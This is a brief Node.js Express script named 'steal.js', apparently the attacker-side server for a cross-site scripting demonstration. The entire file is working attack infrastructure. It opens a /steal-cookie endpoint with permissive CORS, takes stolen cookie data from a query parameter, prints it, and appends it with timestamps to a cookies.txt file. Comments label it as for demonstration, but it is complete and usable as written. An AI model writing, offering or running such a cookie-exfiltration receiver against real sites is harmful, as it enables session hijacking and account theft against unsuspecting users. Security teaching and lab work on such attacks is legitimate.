// malicious/steal.js
const express = require("express");
const fs = require("fs");

const app = express();
const port = 9000;

// Allow all origins (vulnerable for XSS demonstration)
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  next();
});

// Handle query parameters for stealing cookies
app.get("/steal-cookie", (req, res) => {
  const cookieData = req.query.data || "no-cookie"; // Get cookie data from query parameter
  console.log("🍪 Stolen:", cookieData);

  // Save to a file (for demonstration purposes)
  fs.appendFile("cookies.txt", `${new Date().toISOString()} - ${cookieData}\n`, (err) => {
    if (err) console.error("❌ Error writing cookie:", err);
  });

  res.send("✅ Cookie captured");
});

app.listen(port, () => {
  console.log(`🚨 Stealer running at http://localhost:${port}`);
});
